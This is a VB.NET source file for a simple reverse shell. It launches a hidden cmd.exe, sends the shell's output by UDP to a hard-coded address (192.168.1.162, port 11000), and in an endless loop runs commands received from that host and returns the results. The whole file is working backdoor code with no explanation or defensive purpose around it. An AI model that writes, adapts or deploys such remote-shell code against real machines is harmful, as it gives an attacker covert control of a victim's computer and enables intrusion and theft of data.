Imports System.Text
Imports System.Net.Sockets
Imports System.Net

Module Module1

    Dim cmd As New Process
    Dim lastDir As String = ""
    Dim totalSend As Integer = 0


    Sub StartCmd()

        With cmd
            .StartInfo.CreateNoWindow = True
            .StartInfo.RedirectStandardOutput = True
            .StartInfo.RedirectStandardError = True
            .StartInfo.RedirectStandardInput = True
            .StartInfo.UseShellExecute = False
            .StartInfo.FileName = "cmd.exe"
        End With

        cmd.Start()


    End Sub

    Sub SendCommand(command As String)


    End Sub

    Function GetOutput() As String

        Dim done As Boolean = False
        Dim tmpChar As Integer
        Dim tmpString As String = ""
        Dim result As String = ""

        While done = False
            tmpChar = cmd.StandardOutput.Read

            ' Collect characters in a tmpString
            tmpString &= ChrW(tmpChar)

            ' new line
            If tmpChar = 10 Then
                result &= tmpString
                tmpString = ""
            End If

            'Need to find "C:\*>"

            If tmpString.Length >= 4 Then
                If tmpString.Substring(0, 3) = "C:\" Then
                    If tmpString(tmpString.Length - 1) = ">" Then
                        result &= tmpString
                        done = True
                    End If
                End If
            End If

        End While

        Return result
    End Function

    Sub Main()
        ' This constructor arbitrarily assigns the local port number. 
        StartCmd()

        Dim udpClient As New UdpClient()
        Dim out As String = ""

        Try
            Dim sendBytes() As Byte

            ' IPEndPoint object will allow us to read datagrams sent from any source. 
            Dim RemoteIpEndPoint As New IPEndPoint(IPAddress.Any, 0)

            Dim receiveBytes() As Byte
            Dim returnData As String


            out = GetOutput()
            Console.Write(out)

            ' Send start5ing point
            sendBytes = Encoding.ASCII.GetBytes(out)
            udpClient.Send(sendBytes, sendBytes.Length, "192.168.1.162", 11000)

            While True

                ' Get command
                receiveBytes = udpClient.Receive(RemoteIpEndPoint)
                returnData = Encoding.ASCII.GetString(receiveBytes)

                ' Write command
                cmd.StandardInput.WriteLine(returnData)

                ' Send output
                out = GetOutput()
                Console.Write(out)
                sendBytes = Encoding.ASCII.GetBytes(out)
                udpClient.Send(sendBytes, sendBytes.Length, "192.168.1.162", 11000)


            End While
        Catch e As Exception

            udpClient.Close()
            Console.WriteLine(e.ToString())
        End Try

        udpClient.Close()
        Console.ReadKey()

    End Sub

End Module
